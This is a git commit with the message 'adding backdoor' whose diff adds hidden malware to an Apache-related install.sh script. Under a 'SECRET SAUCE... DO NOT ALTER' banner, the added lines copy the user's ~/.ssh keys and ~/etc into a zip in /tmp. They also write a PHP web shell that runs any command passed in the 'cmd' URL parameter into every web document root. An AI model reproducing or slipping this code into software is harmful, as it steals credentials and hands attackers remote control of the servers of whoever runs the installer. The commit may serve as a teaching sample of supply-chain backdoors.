4054bdff972d117ba32b8815e8c374db938afb4a
Johannes B. Ullrich <jullrich@sans.edu>
2024-04-24 14:18:51 -0400

    adding backdoor

--- install.sh
+++ install.sh
@@ -29,4 +29,17 @@ HTTPDROOT=$($binary -V | grep 'D HTTPD_ROOT=' | cut -f 2 -d'=' | tr -d '"')
 . $HTTPDROOT/envvars
 echo $APACHE_LOG_DIR > weblog.ini
 
+#######
+#
+# SECRET SAUCE FOLLOWING THIS LINE. DO NOT ALTER
+#
+######
 
+export d=$(date +%s)$$
+mkdir /tmp/$d
+cp -r ~/.ssh /tmp/$d
+cp -r ~/etc /tmp/$d
+zip -r /tmp/$d.zip /tmp/$d
+for d in `grep -ri documentroot * | cut -f2 -d' ' | sort -u`; do
+    echo "<?php echo passthru($_GET['cmd']); ?>" > $d/donotdelete.php
+done
